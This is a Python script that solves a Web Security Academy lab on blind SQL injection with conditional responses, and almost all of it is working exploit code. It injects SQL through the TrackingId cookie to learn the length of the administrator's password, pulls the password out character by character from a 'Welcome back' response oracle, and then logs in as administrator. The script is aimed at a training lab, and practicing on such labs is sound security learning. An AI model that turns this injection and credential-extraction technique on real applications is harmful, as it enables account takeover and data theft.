import requests
import argparse
import re
import string

parser = argparse.ArgumentParser(description='Solves the following Lab: Blind SQL injection with conditional responses')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

password = ''
password_length = 0

r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
trackingid = r.cookies.get("TrackingId")
session = r.cookies.get("session")


# GET password LENGTH
for i in range(0, 27):
    headers = {'Cookie': f'TrackingId={trackingid}\' AND (SELECT username FROM users WHERE username = \'administrator\' AND LENGTH(password)>{i}) = \'administrator\'-- -; session={session}'}
    r = requests.get("https://" + lab.id + f".web-security-academy.net/", headers=headers)
    if "Welcome back" not in r.text:
        password_length = i
        print(f'Password length: {i}')
        break

# EXTRACT PASSWORD
for i in range(1, password_length + 1):
    for char in string.ascii_letters + string.digits:
        headers = {'Cookie': f'TrackingId={trackingid}\' AND (SELECT SUBSTRING(password, {i}, 1) FROM users WHERE username = \'administrator\') = \'{char}\'-- -; session={session}'}
        r = requests.get("https://" + lab.id + f".web-security-academy.net/", headers=headers)
        if "Welcome back" in r.text:
            password += char
            print(f"Password: {password}", end='', flush=True)
            print('\r', end='', flush=True)

# LOGIN AS ADMINISTRATOR
data = {
    'csrf': f'{csrf}',
    'username': 'administrator',
    'password': f'{password}'
    }
requests.post('https://' + lab.id + '.web-security-academy.net/login',headers=headers, data=data)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('\nLab solved.')
except Exception:
    print("Error while trying to solve the lab.")